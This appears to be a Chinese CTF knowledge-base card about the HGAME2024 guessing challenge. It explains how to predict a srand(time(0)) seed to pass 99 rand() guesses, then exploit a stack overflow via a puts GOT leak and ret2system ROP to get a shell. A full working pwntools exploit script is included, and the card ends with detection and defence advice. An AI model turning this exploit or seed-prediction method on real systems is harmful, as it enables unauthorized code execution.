---
id: ctf-pwn-srand-time-rand-sequence-prediction
title: srand(time(0)) 时间种子伪随机预测：本地同秒复算 rand()%100+1 连过 99 次猜数关卡
type: scenario
domain: ctf
path: ctf/pwn
technique: srand-time-seed-rand-sequence-prediction
tags:
- pwn
- ctf
- prng
- rand
- srand
- time-seed
- prediction
- ctypes
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V532
  verified_at: '2026-11-11T17:13:32+08:00'
  notes: 已对照原文13198与全部61张截图核对：main中seed=time(0)、srand、while(i<=98)共99轮rand()%100+1与清零后的4字节v4比较（img27/28），逐字节chr(k)复算与原文exp一致；ROP偏移0x38与puts泄libc+ret2system与exp一致。修正了卡片原『首轮printf可泄栈地址』的错误描述（printf格式串固定为I see,%s，原文exp的stack值未被使用）。dedup候选均为其他场景时间种子预测（2FA/RC4/哈希密钥等），非同链。
url: /docs/ctf/pwn/ctf-pwn-srand-time-rand-sequence-prediction/
draft: false
kb_aliases:
- 时间种子伪随机预测
- srand(time(0)) 猜数
- rand()%100+1 预测
- libc rand 复算
- 猜数关卡绕过
- HGAME2024 Elden Random Challenge
---

## 一句话结论

程序用 `srand(time(0))` 做种子后循环 99 次比较 `rand() % 100 + 1` 与用户输入，只要在同一个秒内用目标同版本 libc 本地执行 `srand(time(0))` 并逐个复算 `rand() % 100 + 1`，就能预测整段随机序列并通过猜数关卡；随后到达的 `myread()` 栈溢出可用常规 `puts(puts_got)` 泄 libc + ret2system 拿 shell。

## 原理

- **种子可预测**：`time(0)` 只返回秒级时间戳，攻击者本地时间与目标相差通常不超过数秒；在本地对同版本 libc 调用 `srand(time(0))`，可生成与目标完全一致的 `rand()` 序列（glibc 的 `rand` 是固定的 TYPE_3 加法反馈算法，跨版本在一段时期内稳定，但用目标 libc 最稳妥）。
- **比较的是 4 字节整数**：反编译显示 `v6 = rand() % 100 + 1; v4 = 0; read(0, &v4, 8uLL); if (v6 != v4) exit(0);`。每轮先把 `v4` 清零，因此只发送 1 个字节 `chr(k)` 就会让 `v4` 的低字节等于 k、其余字节为 0，与 `v6`（1–100）相等即可通过。
- **连续 99 次**：序列一旦对齐，99 次判断全部通过；程序随后调用 `myread()` 提供栈溢出/ROP 入口。
- **为什么不用暴力**：100 种取值、99 轮，盲猜概率约 `100^-99`；预测种子后成功率只取决于“本地时间是否与目标同一秒”（远程需考虑网络延迟与时钟偏差，可在前后几秒内重试或按偏移枚举）。
- **首个输入不影响利用**：首轮 `read(0, buf, 0x12)` + `printf("I see,%s", buf)` 只是回显输入（格式串固定为 `"I see,%s"`，不能当格式串泄露）；原文 exp 中由该回显读出的 stack 值实际未参与后续 ROP（`%13$p` 为注释里的调试尝试），可忽略。

## 触发条件

- 目标程序使用 `srand(time(0))` + `rand()` 生成安全相关随机数（如猜数、验证码、令牌）。
- 攻击者能在同一秒内完成本地复算并发送 99 个答案（本地/低延迟远程可行；高延迟可先对齐服务器时间或按 time±N 枚举）。
- 本地能加载与目标同版本的 libc（`ctypes.CDLL('./libc.so.6')`），或已实现同款 glibc rand 算法。
- 通过猜数后有可利用的后续漏洞（本例为栈溢出）。

## 利用步骤

1. 用 `ldd`/题目附件确认 libc 版本；用 ctypes 加载该 libc。
2. 记录当前 `time(0)`，调用 `libc.srand(seed)`。
3. 循环 99 次：`recvuntil("Please guess the number:")`，计算 `k = libc.rand() % 100 + 1`，发送 `chr(k)`（单字节，避免换行卡住 `read`）。
4. 通过全部 99 轮后，程序给出奖励并进入 `myread()`；构造 ROP：`'a'*0x38 + pop_rdi + puts_got + puts_plt + read_setup` 泄 libc，再 `ret + pop_rdi + binsh + system`。
5. 若远程失败，按 `time(0)-2 .. time(0)+2` 枚举种子重试，或先通过一次无害请求估算时钟偏差。

## PoC

```python
from pwn import *
from ctypes import cdll
import time

p = process('./pwn')
libc_so = ELF('./libc.so.6')
libcc = cdll.LoadLibrary('./libc.so.6')

p.recvuntil(b'Menlina: Well tarnished, tell me thy name.\n')
p.sendline(b'k')
p.recv(8)
stack = u64(p.recv(6).ljust(8, b'\x00')) - 0xe8

libcc.srand(libcc.time(0))
for i in range(99):
    p.recvuntil(b'Please guess the number:')
    k = libcc.rand() % 100 + 1
    p.send(chr(k))

p.recvuntil(b"Here's a reward to thy brilliant mind.\n")

rdi = 0x401423
puts_got = 0x404018
puts_plt = 0x4010B0
ret = 0x40101a
pl = b'a'*0x38 + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(0x40125D)
p.sendline(pl)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = puts_addr - libc_so.symbols['puts']

system = libc_base + libc_so.symbols['system']
binsh = libc_base + next(libc_so.search(b'/bin/sh\x00'))
pl = b'a'*0x38 + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
p.sendline(pl)
p.interactive()
```

## 变体与关联

- **种子偏移变体**：远程时钟与本地不同步时，先发一个探测请求记录服务器时间（如响应头 Date），再按偏移选择种子；或离线枚举 `time±N` 的少量候选。
- **算法变体**：`rand()` 可换 `random()`、Java `Random`、PHP `mt_rand` 等，思路相同——找到种子空间（时间戳）并在本地复算。
- **同主题卡**：`srand(time(0))` 作为 hash 混淆密钥的复算见 [[ctf-pwn-time-seed-hash-replay-partial-leak-libc]]；未播种 rand 的数组越界利用见 [[ctf-pwn-unseeded-rand-array-oob-bound-overwrite-ret2win]]。
- **边界**：如果目标使用 `getrandom`/`/dev/urandom` 或纳秒级种子，时间预测失效；如果网络 RTT 跨秒且无法重试，成功率下降。

## 检测与防御

- **检测/审计**：源码中出现 `srand(time(0))`、`srand(time(NULL))`、`rand()%N` 用于口令/令牌/猜数等安全判断；随机数可被预测的代码模式。
- **防御**：安全场景禁止使用 `rand()`/`srand(time())`，改用 `getrandom()`、`/dev/urandom`、`secrets` 等 CSPRNG；一次性挑战使用服务端存储的随机 nonce 并限制尝试次数；不要把随机数比较结果作为唯一安全边界。
